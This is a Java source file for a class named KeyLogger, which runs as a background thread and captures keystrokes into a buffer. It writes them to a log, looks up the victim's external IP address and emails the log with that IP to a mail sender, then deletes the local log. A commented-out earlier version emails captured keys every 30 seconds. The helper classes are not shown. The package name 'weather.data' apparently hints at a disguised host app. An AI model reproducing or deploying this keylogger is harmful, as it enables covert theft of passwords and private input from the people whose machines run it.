/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package abc.handler;


import java.io.IOException;
import java.util.logging.Level;
import javax.mail.MessagingException;



/**
 *
 * @author Huong
 */
public class KeyLogger extends Thread {

    private Keybroad keybroad;
    private Logger logger;
    private MailSender sender;
    private String ip;

    public KeyLogger() throws IOException {
        this.keybroad = new Keybroad();
        this.logger = new Logger();
        this.sender = new MailSender();
        ip = weather.data.GetIp.getExternalIpV4();
        this.start();
    }

    public Keybroad getKeybroad() {
        return keybroad;
    }

    @Override
    public void run() {
        while(true){
            if(this.keybroad.isFullBuffer()){
                try {
                    logger.writeLog(this.keybroad.getKeyBuffer());
                    this.keybroad.refreshBuffers();
                    this.sender.sendMail(ip, this.logger.getFilePath());
                    this.logger.removeLog();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }

            }
        }
        
    
//        try {
////            this.sleep(30000);
//            while (true) {
//                try {
//                    String mess = KeyUtil.getKeylog(keybroad.getKeyCache());
//                    if (mess != null) {
//                        EmailUtil.sendMail("Keylog " + new Date().toString(), mess);
//                        keybroad.onSend();
//                        System.out.println("send!");
//                    }else{
//                        System.out.println("empty!");
//                    }
//                    this.sleep(30000);
//                } catch (MessagingException ex) {
//                    keybroad.onFail();
//                }
//            }
//        } catch (InterruptedException ex) {
//            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
//        }
//    }

}


